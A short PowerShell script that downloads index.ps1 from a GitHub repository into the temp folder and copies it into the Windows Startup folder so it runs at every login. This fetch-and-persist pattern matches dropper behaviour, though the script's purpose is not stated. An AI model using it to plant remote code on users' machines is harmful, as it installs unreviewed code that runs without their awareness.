# Define script download location
$ScriptPath = "$env:TEMP\index.ps1"

# Download the script if it's not already running from a file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ArturCassu/ProjetoAlex/main/index.ps1" -OutFile $ScriptPath

# Get the startup folder path
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Define the destination path
$StartupScriptPath = [System.IO.Path]::Combine($StartupFolder, "index.ps1")

# Copy the script to the startup folder
Copy-Item -Path $ScriptPath -Destination $StartupScriptPath -Force

Write-Host "Script added to startup: $StartupScriptPath"
